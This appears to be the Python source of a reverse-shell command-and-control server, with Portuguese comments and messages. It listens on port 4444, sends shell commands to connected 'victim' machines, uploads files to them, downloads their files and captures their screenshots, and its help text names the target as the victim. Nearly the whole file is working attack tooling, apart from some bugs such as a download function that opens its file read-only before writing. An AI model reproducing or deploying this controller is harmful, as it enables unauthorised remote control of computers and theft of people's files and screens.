from termcolor import colored
import socket
import sys
import os
import termcolor
import json
import subprocess
import threading

def data_recv(target):
    data = ""
    while True:
        try:
            data = data + target.recv(4096).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_send(target, data):
    try:
        jsondata = json.dumps(data)
        target.send(jsondata.encode())
    except BrokenPipeError:
        print(colored("[!] Conexão encerrada pelo cliente", "red"))
        target.close()
        sys.exit()

def upload_arq(target, arquivo):
    arq = open(arquivo, "rb")
    target.send(arq.read())

def download_arq(target, arquivo):
    arq = open(arquivo, "rb")
    target.settimeout(5)
    chunk = target.recv(4096)
    while chunk:
        arq.write(chunk)
        try:
            chunk = target.recv(4096)
        except socket.timeout as a:
            break
    target.settimeout(None)
    arq.close()

def handle_client(target, ip):
    count = 0
    while True:
        comando = input(f"* Shell~{ip}: ")
        
        data_send(target, comando)

        if comando == "exit":
            break

        elif comando == "clear":
            os.system("clear")

        elif comando[:3] == "cd ":
            pass

        elif comando[:6] == "upload":
            upload_arq(target, comando[7:])

        elif comando[:8] == "download":
            download_arq(target, comando[9:])

        elif comando[:5] == "print":
            arq = open(f"print{count}.png", "wb")
            target.settimeout(5)
            try:
                while True:
                    chunk = target.recv(4096)
                    if not chunk:
                        break
                    arq.write(chunk)
            except Exception as e:
                print(colored(f"[-] Erro ao ler o arquivo 'print{count}.png': {e}", "red"))
            finally:
                target.settimeout(None)
                arq.close()
                count += 1


        elif comando == "help":
            print(colored('''\n
            clear: Limpa o terminal
            exit: Fecha a conexão com a vitima
            cd + "NomeDoDiretorio": Troca o diretorio da vitima
            upload + "NomeDoArquivo": Envia arquivo para a  maquina da vitima
            download + "NomeDoArquivo":Baixa arquivos da vitima 
            print: Tira print da maquina da vitima                                                     
            help: Ajuda o usuario a uasr os comandos
            ''', "yellow"))
        else:

            resposta = data_recv(target)
            print(resposta)

def main():
    socket_servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_servidor.bind(("192.168.1.11", 4444))
    print(colored('[] Esperando por conexões', "green"))
    socket_servidor.listen(5)

    while True:
        target, ip = socket_servidor.accept()
        print(colored(f"+ Connectado com: {ip}", "green"))
        cliente_thread = threading.Thread(target=handle_client, args=(target, ip))
        cliente_thread.start()

if __name__ == "__main__":
    main()